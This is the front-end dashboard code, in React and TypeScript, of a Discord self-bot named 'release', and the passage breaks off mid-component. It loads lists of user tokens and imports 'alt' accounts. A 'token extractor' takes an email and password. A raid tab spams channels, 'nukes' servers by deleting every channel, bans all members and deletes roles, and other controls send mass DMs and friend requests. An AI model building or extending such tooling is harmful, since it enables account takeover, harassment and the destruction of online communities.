import React, { useState, useEffect } from 'react';
import { Upload, Trash2, Activity, Users, Settings, Skull, Mic, MessageSquare, UserPlus, LogOut, Flame, AlertTriangle, Type, Eraser, ShieldAlert, Gamepad2, Terminal, RefreshCw, History } from 'lucide-react';
import { api } from '../services/api';
import { BotSession, RpcConfig } from '../types';
import { motion } from 'motion/react';
import Rpc from '../pages/Rpc';
import VcTab from './VcTab';
import { CHANGELOG } from '../constants/changelog';

interface DashboardProps {
  onLogout: () => void;
}

const API_BASE = '';

export default function Dashboard({ onLogout }: DashboardProps) {
  const [activeTab, setActiveTab] = useState<'tokens' | 'actions' | 'raid' | 'settings' | 'admin' | 'rpc' | 'commands' | 'tos' | 'faq' | 'get_token' | 'rotator' | 'vc' | 'changelog'>('tokens');
  const [showWelcome, setShowWelcome] = useState(true);
  const [tokens, setTokens] = useState<BotSession[]>([]);
  const [adminSessions, setAdminSessions] = useState<any[]>([]);
  const [logs, setLogs] = useState<string[]>([]);
  const [bgImage, setBgImage] = useState<string | null>(null);
  const [helpBgImage, setHelpBgImage] = useState<string | null>(null);

  // Action Inputs
  const [vcId, setVcId] = useState('');
  const [ownerId, setOwnerId] = useState('');
  const [dmMessage, setDmMessage] = useState('');
  const [friendId, setFriendId] = useState('');
  
  // Raid Inputs
  const [spamChannelId, setSpamChannelId] = useState('');
  const [spamMessage, setSpamMessage] = useState('');
  const [spamCount, setSpamCount] = useState('10');
  const [guildId, setGuildId] = useState('');
  const [renameText, setRenameText] = useState('');
  
  // Alt Importer
  const [altTokensText, setAltTokensText] = useState('');
  const [importingAlts, setImportingAlts] = useState(false);
  const [altStats, setAltStats] = useState<{count: number, alts: any[]}>({count: 0, alts: []});

  // Token Extractor
  const [extractEmail, setExtractEmail] = useState('');
  const [extractPassword, setExtractPassword] = useState('');
  const [extracting, setExtracting] = useState(false);
  const [extractedToken, setExtractedToken] = useState<string | null>(null);
  const [extractStatus, setExtractStatus] = useState('');

  // Status Rotator
  const [statusList, setStatusList] = useState<string[]>(['']);
  const [statusInterval, setStatusInterval] = useState('3');
  const [isRotating, setIsRotating] = useState(false);
  const [multiFeatureEnabled, setMultiFeatureEnabled] = useState(false);
  const [menuMode, setMenuMode] = useState<'text' | 'image'>('text');

  // RPC State
  const [rpcConfigs, setRpcConfigs] = useState<RpcConfig[]>(() => {
      const saved = localStorage.getItem('rpcConfigs');
      return saved ? JSON.parse(saved) : [{
        name: '',
        details: '',
        state: '',
        largeImageKey: '',
        largeImageText: '',
        smallImageKey: '',
        smallImageText: '',
        button1Label: '',
        button1Url: '',
        button2Label: '',
        button2Url: '',
        type: 'PLAYING',
        url: '',
        portrait: false,
        startTimestamp: ''
  }];
  });
  const [rpcSelectedIndex, setRpcSelectedIndex] = useState(() => parseInt(localStorage.getItem('rpcSelectedIndex') || '0'));
  const [rpcHoursElapsed, setRpcHoursElapsed] = useState(() => localStorage.getItem('rpcHoursElapsed') || '');

  useEffect(() => {
    localStorage.setItem('rpcConfigs', JSON.stringify(rpcConfigs));
    localStorage.setItem('rpcSelectedIndex', rpcSelectedIndex.toString());
    localStorage.setItem('rpcHoursElapsed', rpcHoursElapsed);
  }, [rpcConfigs, rpcSelectedIndex, rpcHoursElapsed]);

  useEffect(() => {
    refreshData();
    fetchAltStats();
    fetchCustomStatuses();
    api.getBackground().then(data => {
      if (data.image) setBgImage(data.image);
    });
    api.getHelpBackground().then(data => {
      if (data.image) setHelpBgImage(data.image);
    });
  }, []);

  const fetchCustomStatuses = async () => {
    try {
        const res = await fetch('/api/actions/custom-statuses', {
            headers: { 'Authorization': loggedInToken }
        });
        if (res.ok) {
            const data = await res.json();
            setStatusList(data.statuses.length > 0 ? data.statuses : ['']);
        }
    } catch (e) {
        addLog(`Error fetching custom statuses: ${e}`);
    }
  };

  const loggedInToken = (localStorage.getItem('token') || '').trim().replace(/^["']|["']$/g, '');
  let loggedInUserId = '';
  try {
    if (loggedInToken) {
      loggedInUserId = atob(loggedInToken.split('.')[0]);
    }
  } catch (e) {}

  const loggedInSession = tokens.find(t => t.token === loggedInToken);
  const isAdmin = (loggedInSession && loggedInSession.username === 'yannaaax') || 
                  loggedInUserId === '1413100448482857081' || 
                  loggedInUserId === '1462523761302437889';

  const fetchAltStats = async () => {
      try {
          const res = await fetch('/api/alts', {
              headers: { 'Authorization': loggedInToken }
          });
          if (res.ok) {
              const data = await res.json();
              setAltStats(data);
          }
      } catch (e) {}
  };

  const handleImportAlts = async () => {
      if (!altTokensText.trim()) return;
      setImportingAlts(true);
      const importedTokens = altTokensText.split('\n').map(t => t.trim()).filter(t => t);
      const mainToken = loggedInToken || (tokens.length > 0 ? tokens[0].token : null);
      
      if (!mainToken) {
          addLog('Import failed: No main token found. Please login or add a token first.');
          setImportingAlts(false);
          return;
      }

      try {
          const res = await fetch('/api/alts/import', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ mainToken, altTokens: importedTokens })
          });
          const data = await res.json();
          if (data.success) {
              addLog(`Imported ${data.imported} alts. Failed: ${data.failed}`);
              setAltTokensText('');
              fetchAltStats();
          } else {
              addLog(`Import failed: ${data.error}`);
          }
      } catch (e) {
          addLog(`Import error: ${e}`);
      } finally {
          setImportingAlts(false);
      }
  };

  const refreshData = async () => {
    const data = await api.getTokens();
    setTokens(data);
  };

  const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      const file = e.target.files[0];
      try {
        await api.uploadTokens(file);
        addLog(`Uploaded tokens from ${file.name}`);
        refreshData();
      } catch (err) {
        addLog(`Error uploading tokens: ${err}`);
      }
    }
  };

  const handleBgUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      const file = e.target.files[0];
      const reader = new FileReader();
      reader.onloadend = async () => {
        const base64 = reader.result as string;
        setBgImage(base64);
        await api.setBackground(base64);
        addLog('Background updated');
      };
      reader.readAsDataURL(file);
    }
  };

  const handleHelpBgUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      const file = e.target.files[0];
      const reader = new FileReader();
      reader.onloadend = async () => {
        const base64 = reader.result as string;
        setHelpBgImage(base64);
        await api.setHelpBackground(base64);
        addLog('Help Menu Background updated');
      };
      reader.readAsDataURL(file);
    }
  };

  const addLog = (msg: string) => {
    setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev]);
  };

  const handleExtractToken = async () => {
    if (!extractEmail || !extractPassword) {
      addLog('Email and password required for extraction');
      return;
    }
    setExtracting(true);
    setExtractedToken(null);
    addLog(`Attempting to extract token for ${extractEmail}...`);
    try {
      const res = await fetch(`${API_BASE}/api/auth/extract-token`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: extractEmail, password: extractPassword })
      });
      const data = await res.json();
      if (data.success) {
        setExtractedToken(data.token);
        addLog(`Successfully extracted token!`);
      } else {
        addLog(`Extraction failed: ${data.error}`);
        alert(`Extraction failed: ${data.error}`);
      }
    } catch (e) {
      addLog(`Extraction error: ${e}`);
    } finally {
      setExtracting(false);
    }
  };

  const handleStatusRotate = async () => {
    const filteredList = statusList.map(s => s.trim()).filter(s => s);
    if (filteredList.length === 0) return;
    setIsRotating(true);
    try {
      const res = await api.statusRotate(filteredList, parseInt(statusInterval) || 3);
      addLog(`Status rotation started with ${filteredList.length} statuses`);
    } catch (e) {
      addLog(`Error starting status rotation: ${e}`);
    } finally {
      setIsRotating(false);
    }
  };

  const handleJoinVC = async () => {
    if (!vcId) return;
    addLog(`Initiating Join VC: ${vcId}`);
    await api.joinVC(loggedInToken, vcId);
    refreshData();
  };

  const handleAutoSkull = async () => {
    if (!ownerId) return;
    addLog(`Initiating AutoSkull on: ${ownerId}`);
    await api.autoSkull(ownerId);
    refreshData();
  };

  const handleMassDM = async () => {
    if (!dmMessage) return;
    addLog(`Initiating Mass DM`);
    await api.massDM(dmMessage);
    refreshData();
  };

  const handleFriendRequest = async () => {
    if (!friendId) return;
    addLog(`Sending Friend Requests to: ${friendId}`);
    await api.friendRequest(friendId);
    refreshData();
  };

  const handleSpam = async () => {
    if (!spamChannelId || !spamMessage) return;
    addLog(`Spamming ${spamCount} messages to ${spamChannelId}`);
    await api.spam(spamChannelId, spamMessage, parseInt(spamCount));
  };

  const handleNuke = async () => {
    if (!guildId) return;
    if (!confirm('WARNING: This will delete all channels. Continue?')) return;
    addLog(`Nuking guild ${guildId}`);
    await api.nuke(guildId);
  };

  const handleMassBan = async () => {
    if (!guildId) return;
    if (!confirm('WARNING: This will ban all members. Continue?')) return;
    addLog(`Mass banning in guild ${guildId}`);
    await api.massBan(guildId);
  };

  const handleRename = async () => {
    if (!guildId || !renameText) return;
    addLog(`Renaming channels in ${guildId}`);
    await api.renameChannels(guildId, renameText);
  };

  const handleDeleteRoles = async () => {
    if (!guildId) return;
    addLog(`Deleting roles in ${guildId}`);
    await api.deleteRoles(guildId);
  };

  const handleClearTokens = async () => {
    const msg = isAdmin ? 'Are you sure you want to clear ALL tokens?' : 'Are you sure you want to clear your token?';
    if (confirm(msg)) {
      await api.clearTokens();
      refreshData();
      addLog(isAdmin ? 'Cleared all tokens' : 'Cleared your token');
      if (!isAdmin) {
          onLogout();
      }
    }
  };

  useEffect(() => {
    if (activeTab === 'admin' && isAdmin) {
        fetchAdminData();
    }
  }, [activeTab, isAdmin]);

  const fetchAdminData = async () => {
    const res = await fetch(`${API_BASE}/api/admin/all-sessions`, {
      headers: {
        'Authorization': localStorage.getItem('token') || ''
      }
    });
    if (res.ok) {
      const data = await res.json();
      setAdminSessions(data);
    }
  };

  return (
    <div className="min-h-screen text-zinc-100 font-sans relative overflow-hidden bg-zinc-950">
      {showWelcome && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm">
          <motion.div 
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            className="fantasy-card p-8 rounded-2xl max-w-md w-full text-center relative overflow-hidden"
          >
            <div className="absolute top-4 left-4 pixel-flower floating" />
            <div className="absolute bottom-4 right-4 pixel-human floating-delayed" />
            
            <h2 className="text-3xl font-bold mb-4 text-transparent bg-clip-text bg-gradient-to-r from-purple-400 to-indigo-400">
              Welcome to release
            </h2>
            <p className="text-zinc-300 mb-6 font-light">
              Your futuristic dark fantasy self-bot dashboard.
            </p>
            <div className="bg-black/40 border border-purple-500/30 rounded-lg p-4 mb-6 text-left">
              <h3 className="text-sm font-medium text-purple-300 mb-2">Getting Started:</h3>
              <ul className="text-xs text-zinc-400 space-y-2">
                <li>1. Add your Discord token in the <strong>Tokens</strong> tab.</li>
                <li>2. Use the <strong>.help</strong> command in Discord to see all available commands.</li>
                <li>3. Explore the dashboard to manage your self-bot.</li>
              </ul>
            </div>
            <button 
              onClick={() => setShowWelcome(false)}
              className="fantasy-button w-full py-3 rounded-lg font-medium text-white"
            >
              Enter Dashboard
            </button>
          </motion.div>
        </div>
      )}

      {/* Dynamic Background */}
      {bgImage && (
        <div 
          className="absolute inset-0 z-0 bg-cover bg-center bg-no-repeat opacity-20 blur-sm"
          style={{ backgroundImage: `url(${bgImage})` }}
        />
      )}
      
      <div className="relative z-10 flex h-screen">
        {/* Mobile Header */}
        <div className="md:hidden fixed top-0 left-0 right-0 h-16 bg-zinc-900/90 backdrop-blur-md border-b border-zinc-800 flex items-center justify-between px-4 z-40">
            <h1 className="text-xl font-light tracking-tight text-white">release</h1>
            <button onClick={() => {
                const sidebar = document.getElementById('sidebar');
                if (sidebar) sidebar.classList.toggle('-translate-x-full');
            }} className="p-2 text-zinc-400 hover:text-white">
                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" /></svg>
            </button>
        </div>

        {/* Sidebar */}
        <div id="sidebar" className="w-64 border-r border-zinc-800 bg-zinc-900/95 backdrop-blur-md flex flex-col fixed inset-y-0 left-0 transform -translate-x-full md:relative md:translate-x-0 transition-transform duration-300 ease-in-out z-50">
          <div className="p-6 border-b border-zinc-800 flex justify-between items-center">
            <div>
              <h1 className="text-xl font-light tracking-tight text-white">
                release
              </h1>
              <p className="text-xs text-zinc-500 mt-1">v1.0.0</p>
            </div>
            <button onClick={() => {
                const sidebar = document.getElementById('sidebar');
                if (sidebar) sidebar.classList.add('-translate-x-full');
            }} className="md:hidden p-2 text-zinc-400 hover:text-white">
                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" /></svg>
            </button>
          </div>
          
          <nav className="flex-1 p-4 space-y-1 overflow-y-auto">
            <SidebarItem 
              active={activeTab === 'tokens'} 
              onClick={() => setActiveTab('tokens')} 
              icon={Users} 
              label="Tokens" 
            />
            <SidebarItem 
              active={activeTab === 'actions'} 
              onClick={() => setActiveTab('actions')} 
              icon={Activity} 
              label="Actions" 
            />
            <SidebarItem 
              active={activeTab === 'rotator'} 
              onClick={() => setActiveTab('rotator')} 
              icon={RefreshCw} 
              label="Status Rotator" 
            />
            <SidebarItem 
              active={activeTab === 'raid'} 
              onClick={() => setActiveTab('raid')} 
              icon={Flame} 
              label="Raid" 
            />
            <SidebarItem 
              active={activeTab === 'rpc'} 
              onClick={() => setActiveTab('rpc')} 
              icon={Gamepad2} 
              label="RPC" 
            />
            <SidebarItem 
              active={activeTab === 'commands'} 
              onClick={() => setActiveTab('commands')} 
              icon={Terminal} 
              label="Commands" 
            />
            <SidebarItem 
              active={activeTab === 'vc'} 
              onClick={() => setActiveTab('vc')} 
              icon={Mic} 
              label="VC" 
            />
            <SidebarItem 
              active={activeTab === 'get_token'} 
              onClick={() => setActiveTab('get_token')} 
              icon={UserPlus} 
              label="Get Your Discord Token!!!" 
            />
            <SidebarItem 
              active={activeTab === 'tos'} 
              onClick={() => setActiveTab('tos')} 
              icon={ShieldAlert} 
              label="TOS" 
            />
            <SidebarItem 
              active={activeTab === 'faq'} 
              onClick={() => setActiveTab('faq')} 
              icon={MessageSquare} 
              label="FAQ" 
            />
            <SidebarItem 
              active={activeTab === 'changelog'} 
              onClick={() => setActiveTab('changelog')} 
              icon={History} 
              label="Changelog" 
            />
            <SidebarItem 
              active={activeTab === 'settings'} 
              onClick={() => setActiveTab('settings')} 
              icon={Settings} 
              label="Settings" 
            />
            {isAdmin && (
                <SidebarItem 
                active={activeTab === 'admin'} 
                onClick={() => setActiveTab('admin')} 
                icon={ShieldAlert} 
                label="Admin" 
                />
            )}
          </nav>

          <div className="p-4 border-t border-zinc-800">
            <button 
              onClick={onLogout}
              className="w-full flex items-center gap-3 px-4 py-2 text-sm text-zinc-400 hover:text-white hover:bg-zinc-800 rounded-lg transition-colors"
            >
              <LogOut className="w-4 h-4" />
              Logout
            </button>
          </div>
        </div>

        {/* Main Content */}
        <div className="flex-1 flex flex-col overflow-hidden pt-16 md:pt-0">
          {/* Header */}
          <header className="hidden md:flex h-16 border-b border-zinc-800 items-center justify-between px-8 bg-zinc-900/50 backdrop-blur-sm">
            <h2 className="text-sm font-medium text-zinc-400 uppercase tracking-wider">
              {activeTab === 'tokens' && 'Token Management'}
              {activeTab === 'actions' && 'Actions'}
              {activeTab === 'rotator' && 'Status Rotator'}
              {activeTab === 'raid' && 'Raid Operations'}
              {activeTab === 'rpc' && 'Rich Presence'}
              {activeTab === 'settings' && 'Settings'}
            </h2>
            <div className="flex items-center gap-4">
              <span className="text-xs text-zinc-500">Active Sessions: {tokens.length}</span>
            </div>
          </header>

          {/* Content Area */}
          <main className="flex-1 overflow-y-auto p-8">
            <motion.div
              key={activeTab}
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.2 }}
            >
              {activeTab === 'tokens' && (
                <div className="space-y-6">
                  {/* Upload Section */}
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-6">
                      <h3 className="text-sm font-medium text-zinc-300 mb-4">Import Tokens</h3>
                      <div className="flex items-center gap-4">
                        <label className="flex-1 cursor-pointer group">
                          <div className="h-32 border border-dashed border-zinc-700 rounded-lg flex flex-col items-center justify-center gap-2 group-hover:border-zinc-500 group-hover:bg-zinc-800/50 transition-all">
                            <Upload className="w-6 h-6 text-zinc-500 group-hover:text-zinc-300" />
                            <span className="text-sm text-zinc-500 group-hover:text-zinc-300">Upload .txt file</span>
                          </div>
                          <input type="file" accept=".txt" className="hidden" onChange={handleFileUpload} />
                        </label>
                      </div>
                      <p className="text-xs text-zinc-600 mt-3">One token per line.</p>
                    </div>

                    <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-6 flex flex-col justify-between">
                      <div>
                        <h3 className="text-sm font-medium text-zinc-300 mb-4">Session Control</h3>
                        <p className="text-sm text-zinc-500 mb-4">
                          Manage loaded tokens. Clearing tokens will disconnect all active sessions immediately.
                        </p>
                      </div>
                      <button 
                        onClick={handleClearTokens}
                        className="w-full py-2 bg-red-500/10 hover:bg-red-500/20 border border-red-500/20 text-red-400 rounded-lg flex items-center justify-center gap-2 transition-all text-sm"
                      >
                        <Trash2 className="w-4 h-4" />
                        Clear All Tokens
                      </button>
                    </div>
                  </div>
                </div>
              )}

              {activeTab === 'vc' && (
                <VcTab token={loggedInToken} />
              )}

              {activeTab === 'actions' && (
                <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                  {/* Main Actions */}
                  <div className="lg:col-span-2 space-y-6">
                    {/* Multi-Feature & Menu Mode Card */}
                    <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-6">
                        <h3 className="text-base font-medium text-white mb-4 flex items-center gap-2">
                            <Settings className="w-4 h-4 text-zinc-400" />
                            Alt Control Settings
                        </h3>
                        <div className="space-y-4">
                            <div className="flex items-center justify-between">
                                <span className="text-sm text-zinc-400">Multi-Feature Mode (.tton)</span>
                                <button 
                                    onClick={() => setMultiFeatureEnabled(!multiFeatureEnabled)}
                                    className={`px-4 py-1 rounded-full text-xs font-medium transition-all ${multiFeatureEnabled ? 'bg-emerald-500/20 text-emerald-400' : 'bg-zinc-800 text-zinc-500'}`}
                                >
                                    {multiFeatureEnabled ? 'ON' : 'OFF'}
                                </button>
                            </div>
                            <div className="flex items-center justify-between">
                                <span className="text-sm text-zinc-400">Menu Mode</span>
                                <div className="flex gap-2">
                                    <button 
                                        onClick={() => setMenuMode('text')}
                                        className={`px-4 py-1 rounded-full text-xs font-medium transition-all ${menuMode === 'text' ? 'bg-blue-500/20 text-blue-400' : 'bg-zinc-800 text-zinc-500'}`}
                                    >
                                        Text
                                    </button>
                                    <button 
                                        onClick={() => setMenuMode('image')}
                                        className={`px-4 py-1 rounded-full text-xs font-medium transition-all ${menuMode === 'image' ? 'bg-blue-500/20 text-blue-400' : 'bg-zinc-800 text-zinc-500'}`}
                                    >
                                        Image
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>

                    {/* Join VC Card */}
                    <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-6">
                      <h3 className="text-base font-medium text-white mb-2 flex items-center gap-2">
                        <Mic className="w-4 h-4 text-zinc-400" />
                        Mass VC Join
                      </h3>
                      <p className="text-sm text-zinc-500 mb-6">
                        Connect all tokens to a Voice Channel.
                      </p>
                      <div className="flex gap-4">
                        <input 
                          type="text" 
                          placeholder="Voice Channel ID" 
                          value={vcId}
                          onChange={(e) => setVcId(e.target.value)}
                          className="flex-1 bg-zinc-950 border border-zinc-800 rounded-lg px-4 py-2 text-sm focus:outline-none focus:border-zinc-600 transition-all placeholder:text-zinc-700"
                        />
                        <button 
                          onClick={handleJoinVC}
                          className="px-6 py-2 bg-zinc-100 hover:bg-white text-zinc-900 font-medium rounded-lg transition-all text-sm"
                        >
                          Connect
                        </button>
                      </div>
                    </div>

                    {/* Alt Importer Section */}
                    <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-6">
                        <div className="flex items-center justify-between mb-4">
                            <h3 className="text-lg font-medium text-zinc-300 flex items-center gap-2">
                                <Users className="w-5 h-5 text-emerald-500" />
                                Alt Token Importer
                            </h3>
                            <span className="text-xs text-zinc-500 font-mono">
                                Active Alts: {altStats.count}
                            </span>
                        </div>
                        <div className="space-y-4">
                            <textarea
                                value={altTokensText}
                                onChange={(e) => setAltTokensText(e.target.value)}
                                placeholder="Paste alt tokens here (one per line)..."
                                className="w-full h-32 bg-zinc-950 border border-zinc-800 rounded-lg px-4 py-3 text-xs font-mono text-zinc-400 focus:outline-none focus:border-emerald-500/50 transition-all resize-none placeholder:text-zinc-700"
                            />
                            <div className="flex justify-end">
                                <button
                                    onClick={handleImportAlts}
                                    disabled={importingAlts}
                                    className={`px-6 py-2 bg-emerald-600 hover:bg-emerald-500 text-white font-medium rounded-lg transition-all text-sm flex items-center gap-2 ${importingAlts ? 'opacity-50 cursor-not-allowed' : ''}`}
                                >
                                    {importingAlts ? 'Importing...' : 'Import Alts'}
                                </button>
                            </div>
                            <p className="text-xs text-zinc-600">
                                Note: These alts are controlled via the Main Token. Use <code className="text-zinc-400">.oll</code> to toggle AutoSkull mode.
                            </p>
                        </div>
                    </div>

                    {/* Extra Commands Grid */}
                    <div className="grid grid-cols-2 gap-4">
                        <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-4">
                            <div className="flex items-center gap-2 mb-3 text-zinc-300">
                                <MessageSquare className="w-4 h-4" />
                                <span className="font-medium text-sm">Mass DM</span>
                            </div>
                            <input 
                                type="text" 
                                placeholder="Message..." 
                                value={dmMessage}
                                onChange={(e) => setDmMessage(e.target.value)}
                                className="w-full bg-zinc-950 border border-zinc-800 rounded px-3 py-2 text-xs mb-3 focus:outline-none focus:border-zinc-600 placeholder:text-zinc-700"
                            />
                            <button onClick={handleMassDM} className="w-full py-2 bg-zinc-800 text-zinc-300 text-xs rounded hover:bg-zinc-700 transition-colors">Send</button>
                        </div>

                        <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-4">
                            <div className="flex items-center gap-2 mb-3 text-zinc-300">
                                <UserPlus className="w-4 h-4" />
                                <span className="font-medium text-sm">Friender</span>
                            </div>
                            <input 
                                type="text" 
                                placeholder="User ID..." 
                                value={friendId}
                                onChange={(e) => setFriendId(e.target.value)}
                                className="w-full bg-zinc-950 border border-zinc-800 rounded px-3 py-2 text-xs mb-3 focus:outline-none focus:border-zinc-600 placeholder:text-zinc-700"
                            />
                            <button onClick={handleFriendRequest} className="w-full py-2 bg-zinc-800 text-zinc-300 text-xs rounded hover:bg-zinc-700 transition-colors">Add</button>
                        </div>
                    </div>
                  </div>

                  {/* Live Console */}
                  <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-4 flex flex-col h-[600px]">
                    <h3 className="text-xs font-medium text-zinc-500 uppercase tracking-wider mb-4 flex items-center gap-2">
                      <Activity className="w-3 h-3" />
                      Logs
                    </h3>
                    <div className="flex-1 overflow-y-auto font-mono text-xs space-y-2 pr-2 custom-scrollbar">
                      {logs.map((log, i) => (
                        <div key={i} className="text-zinc-400 border-l border-zinc-700 pl-2 py-1">
                          {log}
                        </div>
                      ))}
                      {logs.length === 0 && (
                        <div className="text-zinc-700 italic">Waiting for activity...</div>
                      )}
                    </div>
                  </div>
                </div>
              )}

              {activeTab === 'rotator' && (
                <div className="max-w-2xl mx-auto">
                  <div className="fantasy-card p-8 rounded-2xl">
                    <h3 className="text-xl font-bold text-white mb-6 flex items-center gap-2">
                      <RefreshCw className="w-5 h-5 text-blue-500" />
                      Status Rotator
                    </h3>
                    <div className="space-y-6">
                      <div>
                        <label className="block text-xs font-medium text-zinc-400 mb-2 uppercase tracking-wider">Statuses</label>
                        <div className="space-y-2">
                          {statusList.map((status, index) => (
                            <div key={index} className="flex gap-2">
                              <input 
                                type="text"
                                className="fantasy-input w-full rounded-xl px-4 py-3 text-sm"
                                value={status}
                                onChange={(e) => {
                                  const newList = [...statusList];
                                  newList[index] = e.target.value;
                                  setStatusList(newList);
                                }}
                              />
                              <button 
                                onClick={() => setStatusList(statusList.filter((_, i) => i !== index))}
                                className="p-3 bg-red-500/10 hover:bg-red-500/20 text-red-500 rounded-xl"
                              >
                                <Trash2 className="w-4 h-4" />
                              </button>
                            </div>
                          ))}
                          <button 
                            onClick={() => setStatusList([...statusList, ''])}
                            className="w-full py-3 border border-dashed border-zinc-700 rounded-xl text-sm text-zinc-500 hover:text-zinc-300 hover:border-zinc-500 transition-all"
                          >
                            + Add Status
                          </button>
                        </div>
                      </div>
                      <div>
                        <label className="block text-xs font-medium text-zinc-400 mb-2 uppercase tracking-wider">Interval (Seconds)</label>
                        <input 
                          type="number"
                          min="1"
                          className="fantasy-input w-full rounded-xl px-4 py-3 text-sm" 
                          value={statusInterval}
                          onChange={(e) => setStatusInterval(e.target.value)}
                        />
                        <p className="text-[10px] text-zinc-500 mt-2 italic">
                          Statuses will rotate every {statusInterval || '3'} seconds.
                        </p>
                      </div>
                      <button 
                        className="fantasy-button w-full py-3 rounded-xl font-medium text-white transition-all transform hover:scale-[1.02] active:scale-[0.98] disabled:opacity-50 flex items-center justify-center gap-2" 
                        onClick={handleStatusRotate}
                        disabled={isRotating}
                      >
                        {isRotating ? (
                          <>
                            <RefreshCw className="w-4 h-4 animate-spin" />
                            Starting...
                          </>
                        ) : (
                          <>
                            <RefreshCw className="w-4 h-4" />
                            Start Rotation
                          </>
                        )}
                      </button>
                    </div>
                  </div>
                </div>
              )}

              {activeTab === 'raid' && (
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  {/* Spam */}
                  <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-6">
                    <h3 className="text-base font-medium text-white mb-4 flex items-center gap-2">
                      <Flame className="w-4 h-4 text-red-500" />
                      Spam
                    </h3>
                    <div className="space-y-4">
                      <input 
                        type="text" 
                        placeholder="Channel ID" 
                        value={spamChannelId}
                        onChange={(e) => setSpamChannelId(e.target.value)}
                        className="w-full bg-zinc-950 border border-zinc-800 rounded-lg px-4 py-2 text-sm focus:outline-none focus:border-red-500/50"
                      />
                      <input 
                        type="text" 
                        placeholder="Message" 
                        value={spamMessage}
                        onChange={(e) => setSpamMessage(e.target.value)}
                        className="w-full bg-zinc-950 border border-zinc-800 rounded-lg px-4 py-2 text-sm focus:outline-none focus:border-red-500/50"
                      />
                      <div className="flex gap-4">
                        <input 
                          type="number" 
                          placeholder="Count" 
                          value={spamCount}
                          onChange={(e) => setSpamCount(e.target.value)}
                          className="w-24 bg-zinc-950 border border-zinc-800 rounded-lg px-4 py-2 text-sm focus:outline-none focus:border-red-500/50"
                        />
                        <button 
                          onClick={handleSpam}
                          className="flex-1 bg-red-500/10 hover:bg-red-500/20 text-red-500 border border-red-500/20 rounded-lg text-sm font-medium transition-colors"
                        >
                          Start Spam
                        </button>
                      </div>
                    </div>
                  </div>

                  {/* Nuke */}
                  <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-6">
                    <h3 className="text-base font-medium text-white mb-4 flex items-center gap-2">
                      <AlertTriangle className="w-4 h-4 text-orange-500" />
                      Nuke
                    </h3>
                    <div className="space-y-4">
                      <input 
                        type="text" 
                        placeholder="Guild ID" 
                        value={guildId}
                        onChange={(e) => setGuildId(e.target.value)}
                        className="w-full bg-zinc-950 border border-zinc-800 rounded-lg px-4 py-2 text-sm focus:outline-none focus:border-orange-500/50"
                      />
                      <button 
                        onClick={handleNuke}
                        className="w-full py-2 bg-orange-500/10 hover:bg-orange-500/20 text-orange-500 border border-orange-500/20 rounded-lg text-sm font-medium transition-colors"
                      >
                        NUKE SERVER
                      </button>
                    </div>
                  </div>

                  {/* Mass Ban */}
                  <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-6">
                    <h3 className="text-base font-medium text-white mb-4 flex items-center gap-2">
                      <ShieldAlert className="w-4 h-4 text-red-600" />
                      Mass Ban
                    </h3>
                    <div className="space-y-4">
                      <input 
                        type="text" 
                        placeholder="Guild ID" 
                        value={guildId}
                        onChange={(e) => setGuildId(e.target.value)}
                        className="w-full bg-zinc-950 border border-zinc-800 rounded-lg px-4 py-2 text-sm focus:outline-none focus:border-red-600/50"
                      />
                      <button 
                        onClick={handleMassBan}
                        className="w-full py-2 bg-red-600/10 hover:bg-red-600/20 text-red-600 border border-red-600/20 rounded-lg text-sm font-medium transition-colors"
                      >
                        BAN ALL MEMBERS
                      </button>
                    </div>
                  </div>

                  {/* Rename & Delete Roles */}
                  <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-6">
                    <h3 className="text-base font-medium text-white mb-4 flex items-center gap-2">
                      <Settings className="w-4 h-4 text-blue-500" />
                      Utils
                    </h3>
                    <div className="space-y-4">
                      <input 
                        type="text" 
                        placeholder="Guild ID" 
                        value={guildId}
                        onChange={(e) => setGuildId(e.target.value)}
                        className="w-full bg-zinc-950 border border-zinc-800 rounded-lg px-4 py-2 text-sm focus:outline-none focus:border-blue-500/50"
                      />
                      <div className="flex gap-2">
                        <input 
                          type="text" 
                          placeholder="New Channel Name" 
                          value={renameText}
                          onChange={(e) => setRenameText(e.target.value)}
                          className="flex-1 bg-zinc-950 border border-zinc-800 rounded-lg px-4 py-2 text-sm focus:outline-none focus:border-blue-500/50"
                        />
                        <button 
                          onClick={handleRename}
                          className="px-4 bg-blue-500/10 hover:bg-blue-500/20 text-blue-500 border border-blue-500/20 rounded-lg text-sm"
                        >
                          <Type className="w-4 h-4" />
                        </button>
                      </div>
                      <button 
                        onClick={handleDeleteRoles}
